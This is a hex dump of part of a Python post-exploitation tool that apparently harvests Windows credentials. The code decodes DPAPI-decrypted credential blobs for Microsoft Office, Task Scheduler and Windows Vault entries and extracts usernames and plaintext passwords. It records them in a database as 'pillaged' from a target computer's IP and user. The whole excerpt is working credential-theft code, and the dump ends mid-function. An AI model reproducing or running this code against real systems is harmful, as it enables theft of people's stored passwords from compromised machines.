-0000e540: 4f46 4649 4345 2873 656c 662c 2075 7365  OFFICE(self, use
-0000e550: 722c 206c 6f63 616c 6669 6c65 2c20 6465  r, localfile, de
-0000e560: 6372 7970 7465 645f 626c 6f62 293a 0a09  crypted_blob):..
-0000e570: 0923 2066 726f 6d20 696d 7061 636b 6574  .# from impacket
-0000e580: 2e65 7365 2069 6d70 6f72 7420 6765 7455  .ese import getU
-0000e590: 6e69 7854 696d 650a 0909 7472 793a 0a09  nixTime...try:..
-0000e5a0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-0000e5b0: 6562 7567 2822 4475 6d70 696e 6720 4d69  ebug("Dumping Mi
-0000e5c0: 6372 6f73 6f66 7420 4f66 6669 6365 2064  crosoft Office d
-0000e5d0: 6563 7279 7074 6564 2063 7265 6465 6e74  ecrypted credent
-0000e5e0: 6961 6c20 626c 6f62 2069 6e66 6f20 746f  ial blob info to
-0000e5f0: 2066 696c 6522 290a 0909 0923 2073 656c   file")....# sel
-0000e600: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000e610: 6465 6372 7970 7465 645f 626c 6f62 290a  decrypted_blob).
-0000e620: 0909 0969 6e66 6f20 3d20 225c 6e22 0a09  ...info = "\n"..
-0000e630: 0909 696e 666f 202b 3d20 6622 5b43 5245  ..info += f"[CRE
-0000e640: 4445 4e54 4941 4c5d 5c6e 220a 0909 0974  DENTIAL]\n"....t
-0000e650: 7279 3a0a 0909 0909 696e 666f 202b 3d20  ry:.....info += 
-0000e660: 6622 4c61 7374 5772 6974 7465 6e20 3a20  f"LastWritten : 
-0000e670: 7b64 6174 6574 696d 652e 7574 6366 726f  {datetime.utcfro
-0000e680: 6d74 696d 6573 7461 6d70 2869 6d70 6163  mtimestamp(impac
-0000e690: 6b65 742e 6470 6170 692e 6765 7455 6e69  ket.dpapi.getUni
-0000e6a0: 7854 696d 6528 6465 6372 7970 7465 645f  xTime(decrypted_
-0000e6b0: 626c 6f62 5b27 4c61 7374 5772 6974 7465  blob['LastWritte
-0000e6c0: 6e27 5d29 297d 5c6e 220a 0909 0909 696e  n']))}\n".....in
-0000e6d0: 666f 202b 3d20 6622 466c 6167 7320 2020  fo += f"Flags   
-0000e6e0: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
-0000e6f0: 5f62 6c6f 625b 2746 6c61 6773 275d 7d20  _blob['Flags']} 
-0000e700: 287b 696d 7061 636b 6574 2e64 7061 7069  ({impacket.dpapi
-0000e710: 2e67 6574 466c 6167 7328 696d 7061 636b  .getFlags(impack
-0000e720: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
-0000e730: 4941 4c5f 464c 4147 532c 2064 6563 7279  IAL_FLAGS, decry
-0000e740: 7074 6564 5f62 6c6f 625b 2746 6c61 6773  pted_blob['Flags
-0000e750: 275d 297d 295c 6e22 0a09 0909 0969 6e66  '])})\n".....inf
-0000e760: 6f20 2b3d 2066 2250 6572 7369 7374 2020  o += f"Persist  
-0000e770: 2020 203a 2030 787b 6465 6372 7970 7465     : 0x{decrypte
-0000e780: 645f 626c 6f62 5b27 5065 7273 6973 7427  d_blob['Persist'
-0000e790: 5d7d 2028 7b69 6d70 6163 6b65 742e 6470  ]} ({impacket.dp
-0000e7a0: 6170 692e 4352 4544 454e 5449 414c 5f50  api.CREDENTIAL_P
-0000e7b0: 4552 5349 5354 2864 6563 7279 7074 6564  ERSIST(decrypted
-0000e7c0: 5f62 6c6f 625b 2750 6572 7369 7374 275d  _blob['Persist']
-0000e7d0: 292e 6e61 6d65 7d29 5c6e 220a 0909 0909  ).name})\n".....
-0000e7e0: 696e 666f 202b 3d20 6622 5479 7065 2020  info += f"Type  
-0000e7f0: 2020 2020 2020 3a20 3078 7b64 6563 7279        : 0x{decry
-0000e800: 7074 6564 5f62 6c6f 625b 2754 7970 6527  pted_blob['Type'
-0000e810: 5d7d 2028 7b69 6d70 6163 6b65 742e 6470  ]} ({impacket.dp
-0000e820: 6170 692e 4352 4544 454e 5449 414c 5f50  api.CREDENTIAL_P
-0000e830: 4552 5349 5354 2864 6563 7279 7074 6564  ERSIST(decrypted
-0000e840: 5f62 6c6f 625b 2754 7970 6527 5d29 2e6e  _blob['Type']).n
-0000e850: 616d 657d 295c 6e22 0a09 0909 6578 6365  ame})\n"....exce
-0000e860: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
-0000e870: 6578 3a0a 0909 0909 7365 6c66 2e6c 6f67  ex:.....self.log
-0000e880: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
-0000e890: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
-0000e8a0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
-0000e8b0: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
-0000e8c0: 7863 6570 7469 6f6e 2031 2064 6563 7279  xception 1 decry
-0000e8d0: 7074 6564 5f62 6c6f 622e 6174 7472 6962  pted_blob.attrib
-0000e8e0: 7574 6573 207b 6263 6f6c 6f72 732e 454e  utes {bcolors.EN
-0000e8f0: 4443 7d22 290a 0909 0909 7365 6c66 2e6c  DC}").....self.l
-0000e900: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
-0000e910: 0a09 0909 696e 666f 202b 3d20 6622 5461  ....info += f"Ta
-0000e920: 7267 6574 2020 2020 2020 3a20 7b64 6563  rget      : {dec
-0000e930: 7279 7074 6564 5f62 6c6f 625b 2754 6172  rypted_blob['Tar
-0000e940: 6765 7427 5d2e 6465 636f 6465 2827 7574  get'].decode('ut
-0000e950: 662d 3136 6c65 2729 7d5c 6e22 0a09 0909  f-16le')}\n"....
-0000e960: 696e 666f 202b 3d20 6622 4465 7363 7269  info += f"Descri
-0000e970: 7074 696f 6e20 3a20 7b64 6563 7279 7074  ption : {decrypt
-0000e980: 6564 5f62 6c6f 625b 2744 6573 6372 6970  ed_blob['Descrip
-0000e990: 7469 6f6e 275d 2e64 6563 6f64 6528 2775  tion'].decode('u
-0000e9a0: 7466 2d31 366c 6527 297d 5c6e 220a 0909  tf-16le')}\n"...
-0000e9b0: 0969 6e66 6f20 2b3d 2066 2255 6e6b 6e6f  .info += f"Unkno
-0000e9c0: 776e 2020 2020 203a 207b 6465 6372 7970  wn     : {decryp
-0000e9d0: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
-0000e9e0: 6e27 5d2e 6465 636f 6465 2827 7574 662d  n'].decode('utf-
-0000e9f0: 3136 6c65 2729 7d5c 6e22 0a09 0909 696e  16le')}\n"....in
-0000ea00: 666f 202b 3d20 6622 5573 6572 6e61 6d65  fo += f"Username
-0000ea10: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
-0000ea20: 5f62 6c6f 625b 2755 7365 726e 616d 6527  _blob['Username'
-0000ea30: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
-0000ea40: 6c65 2729 7d5c 6e22 0a09 0909 7472 793a  le')}\n"....try:
-0000ea50: 0a09 0909 0969 6e66 6f20 2b3d 2066 2255  .....info += f"U
-0000ea60: 6e6b 6e6f 776e 3320 2020 2020 3a20 7b64  nknown3     : {d
-0000ea70: 6563 7279 7074 6564 5f62 6c6f 625b 2755  ecrypted_blob['U
-0000ea80: 6e6b 6e6f 776e 3327 5d2e 6465 636f 6465  nknown3'].decode
-0000ea90: 2827 7574 662d 3136 6c65 2729 7d5c 6e22  ('utf-16le')}\n"
-0000eaa0: 0a09 0909 0970 6173 7377 6f72 6420 3d20  .....password = 
-0000eab0: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000eac0: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
-0000ead0: 6528 2775 7466 2d31 366c 6527 290a 0909  e('utf-16le')...
-0000eae0: 0965 7863 6570 7420 556e 6963 6f64 6544  .except UnicodeD
-0000eaf0: 6563 6f64 6545 7272 6f72 3a0a 0909 0909  ecodeError:.....
-0000eb00: 696e 666f 202b 3d20 6622 556e 6b6e 6f77  info += f"Unknow
-0000eb10: 6e33 2e20 2020 2020 3a20 7b64 6563 7279  n3.     : {decry
-0000eb20: 7074 6564 5f62 6c6f 625b 2755 6e6b 6e6f  pted_blob['Unkno
-0000eb30: 776e 3327 5d2e 6465 636f 6465 2827 6c61  wn3'].decode('la
-0000eb40: 7469 6e2d 3127 297d 5c6e 220a 0909 0909  tin-1')}\n".....
-0000eb50: 7061 7373 776f 7264 203d 2064 6563 7279  password = decry
-0000eb60: 7074 6564 5f62 6c6f 625b 2755 6e6b 6e6f  pted_blob['Unkno
-0000eb70: 776e 3327 5d2e 6465 636f 6465 2827 6c61  wn3'].decode('la
-0000eb80: 7469 6e2d 3127 290a 0a09 0909 2323 2323  tin-1').....####
-0000eb90: 2323 2323 2323 2323 5052 4f43 4553 5349  ########PROCESSI
-0000eba0: 4e47 2044 4154 410a 0909 0973 656c 662e  NG DATA....self.
-0000ebb0: 6462 2e61 6464 5f63 7265 647a 2863 7265  db.add_credz(cre
-0000ebc0: 647a 5f74 7970 653d 2762 726f 7773 6572  dz_type='browser
-0000ebd0: 2d69 6e74 6572 6e65 745f 6578 706c 6f72  -internet_explor
-0000ebe0: 6572 272c 0a09 0909 0909 0909 2020 6372  er',........  cr
-0000ebf0: 6564 7a5f 7573 6572 6e61 6d65 3d64 6563  edz_username=dec
-0000ec00: 7279 7074 6564 5f62 6c6f 625b 2755 7365  rypted_blob['Use
-0000ec10: 726e 616d 6527 5d2e 6465 636f 6465 2827  rname'].decode('
-0000ec20: 7574 662d 3136 6c65 2729 2c0a 0909 0909  utf-16le'),.....
-0000ec30: 0909 0920 2063 7265 647a 5f70 6173 7377  ...  credz_passw
-0000ec40: 6f72 643d 7061 7373 776f 7264 2c0a 0909  ord=password,...
-0000ec50: 0909 0909 0920 2063 7265 647a 5f74 6172  .....  credz_tar
-0000ec60: 6765 743d 6465 6372 7970 7465 645f 626c  get=decrypted_bl
-0000ec70: 6f62 5b27 5461 7267 6574 275d 2e64 6563  ob['Target'].dec
-0000ec80: 6f64 6528 2775 7466 2d31 366c 6527 292c  ode('utf-16le'),
-0000ec90: 0a09 0909 0909 0909 2020 6372 6564 7a5f  ........  credz_
-0000eca0: 7061 7468 3d6c 6f63 616c 6669 6c65 2c0a  path=localfile,.
-0000ecb0: 0909 0909 0909 0920 2070 696c 6c61 6765  .......  pillage
-0000ecc0: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
-0000ecd0: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
-0000ece0: 7461 7267 6574 5f69 702c 0a09 0909 0909  target_ip,......
-0000ecf0: 0909 2020 7069 6c6c 6167 6564 5f66 726f  ..  pillaged_fro
-0000ed00: 6d5f 7573 6572 6e61 6d65 3d75 7365 722e  m_username=user.
-0000ed10: 7573 6572 6e61 6d65 290a 0909 0973 656c  username)....sel
-0000ed20: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000ed30: 696e 666f 290a 0909 0972 6574 7572 6e20  info)....return 
-0000ed40: 696e 666f 0a09 0965 7863 6570 7420 4578  info...except Ex
-0000ed50: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
-0000ed60: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-0000ed70: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
-0000ed80: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-0000ed90: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-0000eda0: 5741 524e 494e 477d 4578 6365 7074 696f  WARNING}Exceptio
-0000edb0: 6e20 3320 6475 6d70 5f63 7265 6465 6e74  n 3 dump_credent
-0000edc0: 6961 6c5f 626c 6f62 207b 6263 6f6c 6f72  ial_blob {bcolor
-0000edd0: 732e 454e 4443 7d22 290a 0909 0973 656c  s.ENDC}")....sel
-0000ede0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000edf0: 6578 290a 0a09 6465 6620 6475 6d70 5f43  ex)...def dump_C
-0000ee00: 5245 4445 4e54 4941 4c5f 5441 534b 5343  REDENTIAL_TASKSC
-0000ee10: 4845 4455 4c45 5228 7365 6c66 2c20 7573  HEDULER(self, us
-0000ee20: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
-0000ee30: 6563 7279 7074 6564 5f62 6c6f 6229 3a0a  ecrypted_blob):.
-0000ee40: 0909 2320 6672 6f6d 2069 6d70 6163 6b65  ..# from impacke
-0000ee50: 742e 6573 6520 696d 706f 7274 2067 6574  t.ese import get
-0000ee60: 556e 6978 5469 6d65 0a09 0974 7279 3a0a  UnixTime...try:.
-0000ee70: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-0000ee80: 6465 6275 6728 2244 756d 7069 6e67 2054  debug("Dumping T
-0000ee90: 4153 4b53 4348 4544 554c 4552 2064 6563  ASKSCHEDULER dec
-0000eea0: 7279 7074 6564 2063 7265 6465 6e74 6961  rypted credentia
-0000eeb0: 6c20 626c 6f62 2069 6e66 6f20 746f 2066  l blob info to f
-0000eec0: 696c 6522 290a 0909 0923 2073 656c 662e  ile")....# self.
-0000eed0: 6c6f 6767 696e 672e 6465 6275 6728 6465  logging.debug(de
-0000eee0: 6372 7970 7465 645f 626c 6f62 290a 0909  crypted_blob)...
-0000eef0: 0969 6e66 6f20 3d20 225c 6e22 0a09 0909  .info = "\n"....
-0000ef00: 696e 666f 202b 3d20 6622 5b43 5245 4445  info += f"[CREDE
-0000ef10: 4e54 4941 4c5d 5c6e 220a 0909 0974 7279  NTIAL]\n"....try
-0000ef20: 3a0a 0909 0909 696e 666f 202b 3d20 6622  :.....info += f"
-0000ef30: 4c61 7374 5772 6974 7465 6e20 3a20 7b64  LastWritten : {d
-0000ef40: 6174 6574 696d 652e 7574 6366 726f 6d74  atetime.utcfromt
-0000ef50: 696d 6573 7461 6d70 2869 6d70 6163 6b65  imestamp(impacke
-0000ef60: 742e 6470 6170 692e 6765 7455 6e69 7854  t.dpapi.getUnixT
-0000ef70: 696d 6528 6465 6372 7970 7465 645f 626c  ime(decrypted_bl
-0000ef80: 6f62 5b27 4c61 7374 5772 6974 7465 6e27  ob['LastWritten'
-0000ef90: 5d29 297d 5c6e 220a 0909 0909 696e 666f  ]))}\n".....info
-0000efa0: 202b 3d20 6622 466c 6167 7320 2020 2020   += f"Flags     
-0000efb0: 2020 3a20 7b64 6563 7279 7074 6564 5f62    : {decrypted_b
-0000efc0: 6c6f 625b 2746 6c61 6773 275d 7d20 287b  lob['Flags']} ({
-0000efd0: 696d 7061 636b 6574 2e64 7061 7069 2e67  impacket.dpapi.g
-0000efe0: 6574 466c 6167 7328 696d 7061 636b 6574  etFlags(impacket
-0000eff0: 2e64 7061 7069 2e43 5245 4445 4e54 4941  .dpapi.CREDENTIA
-0000f000: 4c5f 464c 4147 532c 2064 6563 7279 7074  L_FLAGS, decrypt
-0000f010: 6564 5f62 6c6f 625b 2746 6c61 6773 275d  ed_blob['Flags']
-0000f020: 297d 295c 6e22 0a09 0909 0969 6e66 6f20  )})\n".....info 
-0000f030: 2b3d 2066 2250 6572 7369 7374 2020 2020  += f"Persist    
-0000f040: 203a 2030 787b 6465 6372 7970 7465 645f   : 0x{decrypted_
-0000f050: 626c 6f62 5b27 5065 7273 6973 7427 5d7d  blob['Persist']}
-0000f060: 2028 7b69 6d70 6163 6b65 742e 6470 6170   ({impacket.dpap
-0000f070: 692e 4352 4544 454e 5449 414c 5f50 4552  i.CREDENTIAL_PER
-0000f080: 5349 5354 2864 6563 7279 7074 6564 5f62  SIST(decrypted_b
-0000f090: 6c6f 625b 2750 6572 7369 7374 275d 292e  lob['Persist']).
-0000f0a0: 6e61 6d65 7d29 5c6e 220a 0909 0909 696e  name})\n".....in
-0000f0b0: 666f 202b 3d20 6622 5479 7065 2020 2020  fo += f"Type    
-0000f0c0: 2020 2020 3a20 3078 7b64 6563 7279 7074      : 0x{decrypt
-0000f0d0: 6564 5f62 6c6f 625b 2754 7970 6527 5d7d  ed_blob['Type']}
-0000f0e0: 2028 7b69 6d70 6163 6b65 742e 6470 6170   ({impacket.dpap
-0000f0f0: 692e 4352 4544 454e 5449 414c 5f50 4552  i.CREDENTIAL_PER
-0000f100: 5349 5354 2864 6563 7279 7074 6564 5f62  SIST(decrypted_b
-0000f110: 6c6f 625b 2754 7970 6527 5d29 2e6e 616d  lob['Type']).nam
-0000f120: 657d 295c 6e22 0a09 0909 6578 6365 7074  e})\n"....except
-0000f130: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
-0000f140: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
-0000f150: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
-0000f160: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-0000f170: 7461 7267 6574 5f69 707d 5d20 7b62 636f  target_ip}] {bco
-0000f180: 6c6f 7273 2e57 4152 4e49 4e47 7d45 7863  lors.WARNING}Exc
-0000f190: 6570 7469 6f6e 2031 2064 6563 7279 7074  eption 1 decrypt
-0000f1a0: 6564 5f62 6c6f 622e 6174 7472 6962 7574  ed_blob.attribut
-0000f1b0: 6573 207b 6263 6f6c 6f72 732e 454e 4443  es {bcolors.ENDC
-0000f1c0: 7d22 290a 0909 0909 7365 6c66 2e6c 6f67  }").....self.log
-0000f1d0: 6769 6e67 2e64 6562 7567 2865 7829 0a09  ging.debug(ex)..
-0000f1e0: 0909 696e 666f 202b 3d20 6622 5461 7267  ..info += f"Targ
-0000f1f0: 6574 2020 2020 2020 3a20 7b64 6563 7279  et      : {decry
-0000f200: 7074 6564 5f62 6c6f 625b 2754 6172 6765  pted_blob['Targe
-0000f210: 7427 5d2e 6465 636f 6465 2827 7574 662d  t'].decode('utf-
-0000f220: 3136 6c65 2729 7d5c 6e22 0a09 0909 696e  16le')}\n"....in
-0000f230: 666f 202b 3d20 6622 4465 7363 7269 7074  fo += f"Descript
-0000f240: 696f 6e20 3a20 7b64 6563 7279 7074 6564  ion : {decrypted
-0000f250: 5f62 6c6f 625b 2744 6573 6372 6970 7469  _blob['Descripti
-0000f260: 6f6e 275d 2e64 6563 6f64 6528 2775 7466  on'].decode('utf
-0000f270: 2d31 366c 6527 297d 5c6e 220a 0909 0969  -16le')}\n"....i
-0000f280: 6e66 6f20 2b3d 2066 2255 6e6b 6e6f 776e  nfo += f"Unknown
-0000f290: 2020 2020 203a 207b 6465 6372 7970 7465       : {decrypte
-0000f2a0: 645f 626c 6f62 5b27 556e 6b6e 6f77 6e27  d_blob['Unknown'
-0000f2b0: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
-0000f2c0: 6c65 2729 7d5c 6e22 0a09 0909 696e 666f  le')}\n"....info
-0000f2d0: 202b 3d20 6622 5573 6572 6e61 6d65 2020   += f"Username  
-0000f2e0: 2020 3a20 7b64 6563 7279 7074 6564 5f62    : {decrypted_b
-0000f2f0: 6c6f 625b 2755 7365 726e 616d 6527 5d2e  lob['Username'].
-0000f300: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
-0000f310: 2729 7d5c 6e22 0a09 0909 7472 793a 0a09  ')}\n"....try:..
-0000f320: 0909 0969 6e66 6f20 2b3d 2066 2255 6e6b  ...info += f"Unk
-0000f330: 6e6f 776e 3320 2020 2020 3a20 7b64 6563  nown3     : {dec
-0000f340: 7279 7074 6564 5f62 6c6f 625b 2755 6e6b  rypted_blob['Unk
-0000f350: 6e6f 776e 3327 5d2e 6465 636f 6465 2827  nown3'].decode('
-0000f360: 7574 662d 3136 6c65 2729 7d5c 6e22 0a09  utf-16le')}\n"..
-0000f370: 0909 0970 6173 7377 6f72 6420 3d20 6465  ...password = de
-0000f380: 6372 7970 7465 645f 626c 6f62 5b27 556e  crypted_blob['Un
-0000f390: 6b6e 6f77 6e33 275d 2e64 6563 6f64 6528  known3'].decode(
-0000f3a0: 2775 7466 2d31 366c 6527 290a 0909 0965  'utf-16le')....e
-0000f3b0: 7863 6570 7420 556e 6963 6f64 6544 6563  xcept UnicodeDec
-0000f3c0: 6f64 6545 7272 6f72 3a0a 0909 0909 696e  odeError:.....in
-0000f3d0: 666f 202b 3d20 6622 556e 6b6e 6f77 6e33  fo += f"Unknown3
-0000f3e0: 2e20 2020 2020 3a20 7b64 6563 7279 7074  .     : {decrypt
-0000f3f0: 6564 5f62 6c6f 625b 2755 6e6b 6e6f 776e  ed_blob['Unknown
-0000f400: 3327 5d2e 6465 636f 6465 2827 6c61 7469  3'].decode('lati
-0000f410: 6e2d 3127 297d 5c6e 220a 0909 0909 7061  n-1')}\n".....pa
-0000f420: 7373 776f 7264 203d 2064 6563 7279 7074  ssword = decrypt
-0000f430: 6564 5f62 6c6f 625b 2755 6e6b 6e6f 776e  ed_blob['Unknown
-0000f440: 3327 5d2e 6465 636f 6465 2827 6c61 7469  3'].decode('lati
-0000f450: 6e2d 3127 290a 0909 0923 2323 2323 2323  n-1')....#######
-0000f460: 2323 2323 2350 524f 4345 5353 494e 4720  #####PROCESSING 
-0000f470: 4441 5441 0a09 0909 7365 6c66 2e64 622e  DATA....self.db.
-0000f480: 6164 645f 6372 6564 7a28 6372 6564 7a5f  add_credz(credz_
-0000f490: 7479 7065 3d27 7461 736b 7363 6865 6475  type='taskschedu
-0000f4a0: 6c65 7227 2c0a 0909 0909 0909 0920 2063  ler',........  c
-0000f4b0: 7265 647a 5f75 7365 726e 616d 653d 6465  redz_username=de
-0000f4c0: 6372 7970 7465 645f 626c 6f62 5b27 5573  crypted_blob['Us
-0000f4d0: 6572 6e61 6d65 275d 2e64 6563 6f64 6528  ername'].decode(
-0000f4e0: 2775 7466 2d31 366c 6527 292c 0a09 0909  'utf-16le'),....
-0000f4f0: 0909 0909 2020 6372 6564 7a5f 7061 7373  ....  credz_pass
-0000f500: 776f 7264 3d70 6173 7377 6f72 642c 0a09  word=password,..
-0000f510: 0909 0909 0909 2020 6372 6564 7a5f 7461  ......  credz_ta
-0000f520: 7267 6574 3d64 6563 7279 7074 6564 5f62  rget=decrypted_b
-0000f530: 6c6f 625b 2754 6172 6765 7427 5d2e 6465  lob['Target'].de
-0000f540: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
-0000f550: 2c0a 0909 0909 0909 0920 2063 7265 647a  ,........  credz
-0000f560: 5f70 6174 683d 6c6f 6361 6c66 696c 652c  _path=localfile,
-0000f570: 0a09 0909 0909 0909 2020 7069 6c6c 6167  ........  pillag
-0000f580: 6564 5f66 726f 6d5f 636f 6d70 7574 6572  ed_from_computer
-0000f590: 5f69 703d 7365 6c66 2e6f 7074 696f 6e73  _ip=self.options
-0000f5a0: 2e74 6172 6765 745f 6970 2c0a 0909 0909  .target_ip,.....
-0000f5b0: 0909 0920 2070 696c 6c61 6765 645f 6672  ...  pillaged_fr
-0000f5c0: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
-0000f5d0: 2e75 7365 726e 616d 6529 0a09 0909 7365  .username)....se
-0000f5e0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-0000f5f0: 2869 6e66 6f29 0a09 0909 7265 7475 726e  (info)....return
-0000f600: 2069 6e66 6f0a 0909 6578 6365 7074 2045   info...except E
-0000f610: 7863 6570 7469 6f6e 2061 7320 6578 3a0a  xception as ex:.
-0000f620: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-0000f630: 6465 6275 6728 0a09 0909 0966 225b 7b73  debug(.....f"[{s
-0000f640: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-0000f650: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
-0000f660: 2e57 4152 4e49 4e47 7d45 7863 6570 7469  .WARNING}Excepti
-0000f670: 6f6e 2033 2064 756d 705f 6372 6564 656e  on 3 dump_creden
-0000f680: 7469 616c 5f62 6c6f 6220 7b62 636f 6c6f  tial_blob {bcolo
-0000f690: 7273 2e45 4e44 437d 2229 0a09 0909 7365  rs.ENDC}")....se
-0000f6a0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-0000f6b0: 2865 7829 0a0a 0964 6566 2070 726f 6365  (ex)...def proce
-0000f6c0: 7373 5f64 6563 7279 7074 6564 5f76 6175  ss_decrypted_vau
-0000f6d0: 6c74 2873 656c 662c 2075 7365 722c 2073  lt(self, user, s
-0000f6e0: 6563 7265 745f 6669 6c65 293a 2020 2320  ecret_file):  # 
-0000f6f0: 6461 7461 202c 7573 6572 202c 6c6f 6361  data ,user ,loca
-0000f700: 6c66 696c 652c 626c 6f62 5f74 7970 652c  lfile,blob_type,
-0000f710: 6172 6773 3d5b 5d29 3a0a 0909 7472 793a  args=[]):...try:
-0000f720: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-0000f730: 2e64 6562 7567 280a 0909 0909 6622 5b7b  .debug(.....f"[{
-0000f740: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-0000f750: 6765 745f 6970 7d5d 205b 2b5d 2070 726f  get_ip}] [+] pro
-0000f760: 6365 7373 5f64 6563 7279 7074 6564 5f76  cess_decrypted_v
-0000f770: 6175 6c74 206f 6620 7b73 6563 7265 745f  ault of {secret_
-0000f780: 6669 6c65 7d20 7b62 636f 6c6f 7273 2e45  file} {bcolors.E
-0000f790: 4e44 437d 2229 0a09 0909 626c 6f62 5f74  NDC}")....blob_t
-0000f7a0: 7970 6520 3d20 7365 6372 6574 5f66 696c  ype = secret_fil
-0000f7b0: 655b 2774 7970 6527 5d0a 0909 096c 6f63  e['type']....loc
-0000f7c0: 616c 6669 6c65 203d 2073 6563 7265 745f  alfile = secret_
-0000f7d0: 6669 6c65 5b27 7061 7468 275d 0a09 0909  file['path']....
-0000f7e0: 6461 7461 203d 2073 6563 7265 745f 6669  data = secret_fi
-0000f7f0: 6c65 5b27 6461 7461 275d 0a0a 0909 0969  le['data'].....i
-0000f800: 6620 626c 6f62 5f74 7970 6520 3d3d 2027  f blob_type == '
-0000f810: 7661 756c 7427 206f 7220 626c 6f62 5f74  vault' or blob_t
-0000f820: 7970 6520 3d3d 2027 7663 7264 273a 0a09  ype == 'vcrd':..
-0000f830: 0909 0974 7279 3a0a 0909 0909 0976 6175  ...try:......vau
-0000f840: 6c74 5f6e 616d 6520 3d20 7365 6372 6574  lt_name = secret
-0000f850: 5f66 696c 655b 2776 6175 6c74 5f6e 616d  _file['vault_nam
-0000f860: 6527 5d20 2023 2061 7267 735b 305d 0a09  e']  # args[0]..
-0000f870: 0909 0909 7661 756c 745f 7479 7065 203d  ....vault_type =
-0000f880: 2073 6563 7265 745f 6669 6c65 5b27 7661   secret_file['va
-0000f890: 756c 745f 7479 7065 275d 2020 2320 6172  ult_type']  # ar
-0000f8a0: 6773 5b31 5d0a 0909 0909 0973 656c 662e  gs[1]......self.
-0000f8b0: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
-0000f8c0: 5072 6f63 6573 7369 6e67 2056 6175 6c74  Processing Vault
-0000f8d0: 207b 7661 756c 745f 6e61 6d65 7d20 2d20   {vault_name} - 
-0000f8e0: 7479 7065 203a 207b 7661 756c 745f 7479  type : {vault_ty
-0000f8f0: 7065 7d20 2229 0a09 0909 0909 6966 2076  pe} ")......if v
-0000f900: 6175 6c74 5f74 7970 6520 3d3d 2027 5769  ault_type == 'Wi
-0000f910: 6e42 696f 204b 6579 273a 0a09 0909 0909  nBio Key':......
-0000f920: 0964 6174 6120 3d20 7365 6c66 2e64 756d  .data = self.dum
-0000f930: 705f 5641 554c 545f 5749 4e5f 4249 4f5f  p_VAULT_WIN_BIO_
-0000f940: 4b45 5928 7573 6572 2c20 6c6f 6361 6c66  KEY(user, localf
-0000f950: 696c 652c 2064 6174 6129 0a09 0909 0909  ile, data)......
-0000f960: 0973 656c 662e 6c6f 6773 6563 7265 7428  .self.logsecret(
-0000f970: 6622 5661 756c 7420 7b76 6175 6c74 5f6e  f"Vault {vault_n
-0000f980: 616d 657d 203a 207b 6461 7461 7d20 2229  ame} : {data} ")
-0000f990: 0a09 0909 0909 656c 6966 2076 6175 6c74  ......elif vault
-0000f9a0: 5f74 7970 6520 3d3d 2027 4e47 4320 4c6f  _type == 'NGC Lo
-0000f9b0: 6361 6c20 4163 636f 756e 7420 4c6f 676f  cal Account Logo
-0000f9c0: 6e20 5661 756c 7420 4372 6564 656e 7469  n Vault Credenti
-0000f9d0: 616c 273a 0a09 0909 0909 0964 6174 6120  al':.......data 
-0000f9e0: 3d20 7365 6c66 2e64 756d 705f 5641 554c  = self.dump_VAUL
-0000f9f0: 545f 4e47 435f 4c4f 4341 4c5f 4143 434f  T_NGC_LOCAL_ACCO
-0000fa00: 4f55 4e54 2875 7365 722c 206c 6f63 616c  OUNT(user, local
-0000fa10: 6669 6c65 2c20 6461 7461 290a 0909 0909  file, data).....
-0000fa20: 0909 7365 6c66 2e6c 6f67 7365 6372 6574  ..self.logsecret
-0000fa30: 2866 2256 6175 6c74 207b 7661 756c 745f  (f"Vault {vault_
-0000fa40: 6e61 6d65 7d20 3a20 7b64 6174 617d 2022  name} : {data} "
-0000fa50: 290a 0909 0909 0965 6c69 6620 224e 4743  )......elif "NGC
-0000fa60: 2220 696e 2076 6175 6c74 5f74 7970 653a  " in vault_type:
